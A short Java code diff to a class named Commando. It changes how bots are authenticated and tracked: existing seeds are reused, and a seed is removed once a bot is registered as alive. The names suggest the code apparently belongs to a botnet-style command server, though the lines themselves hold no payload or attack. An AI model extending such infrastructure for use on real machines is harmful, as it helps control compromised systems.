@@ -101,6 +101,8 @@ public class Commando {
 	 */
 	public Pairs<Long, Integer> authReq(String idBot) {
 		Pairs<Long, Integer> response;
+		if(auth.getBotSeed().indexOfValue1(idBot)>=0)
+			return auth.getBotSeed().getByValue1(idBot).getValue2();
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
 		auth.getBotSeed().add(new Pairs<String, Pairs<Long, Integer>>(idBot,new Pairs<Long, Integer>(keyNumber, iterationNumber)));
@@ -138,6 +140,7 @@ public class Commando {
 						nServ.getAliveBot().add(botAlive);
 					}
 				}
+				auth.getBotSeed().removeByValue1(idBot);
 			}
 		}
 		return response;
